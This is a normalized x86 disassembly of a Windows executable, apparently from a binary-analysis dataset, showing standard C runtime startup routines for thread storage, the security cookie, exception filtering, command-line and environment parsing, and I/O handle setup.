mov eax [ ebp - 0x1b0 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4054db
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_409db2
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1b0 ]
inc [ ebp - 0x1cc ]
lea ecx [ ebp - 0x1fc ]
push ecx
push eax
push [ ebp - 0x1c0 ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
mov ebx [ ebp - 0x1b4 ]
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_4054db
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1b0 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4054db
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_409db2
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1b0 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4054db
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov [ ebp - 0x194 ] eax
movzx eax al
sub_4065a8
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_4065dc
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_40793d
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_406619
push 0x8
push r--data
call sub_403d50
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_407a6d
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4066bb
push 0xc
call sub_407a6d
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_409270
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4066c4
call sub_403d95
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_4066cd
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_4065a8
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40393d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_405311
pop ecx
xor esi esi
push 0x0
push esi
call sub_406619
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_406760
push 0x8
push r--data
call sub_403d50
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_403d95
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_405311
pop ecx
push 0xd
call sub_407a6d
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_405311
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40687a
push 0xc
call sub_407a6d
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406886
push esi
call sub_405311
pop ecx
push edi
call sub_4092ff
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_405311
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_409398
pop ecx
sub_40688f
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_4065dc
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_40659f
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_403ab1
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_4078f3
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_4065dc
mov edi [ DecodePointer@IAT ]
push sub_406760
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40393d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_406619
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_406a0a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_407aa0
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_406a5a
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_406a80
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_406a5a
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4030d9
leave
retn
push 0x3
call sub_40a546
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_40a546
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_40a4e3
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_405450
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_404fce
push esi
call sub_40a4c8
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_40a4e3
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_40a386
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_40a4c8
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_40a3fb
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_40a386
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_40a21a
add esp 0xc
jmp r-xdata
sub_406c2f
push 0x3
call sub_40a546
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_406a80
push 0xff
call sub_406a80
pop ecx
pop ecx
push 0x3
call sub_40a546
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_406c68
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4066cd
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_406db2
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_409252
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_40a5d8
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_406e11
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_409252
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40393d
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_405450
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_405450
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_405311
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_40393d
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_405311
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_409994
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_404fce
int3
add edi 0x4
sub_406eed
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_40a5d8
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_40a5d8
pop ecx
test eax eax
je r-xdata
call sub_40a5d8
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_407087
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_409252
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_406eed
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_4038f8
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_406eed
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_407142
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_4038f8
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_405311
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_4071d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_40393d
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_40393d
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_40741e
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_407444
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_407488
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40754d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_405450
lea esi [ eax + 0x1 ]
push esi
call sub_407637
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_409994
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_4075ab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_40758d
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_40754d
jmp r-xdata
sub_4075eb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40758d
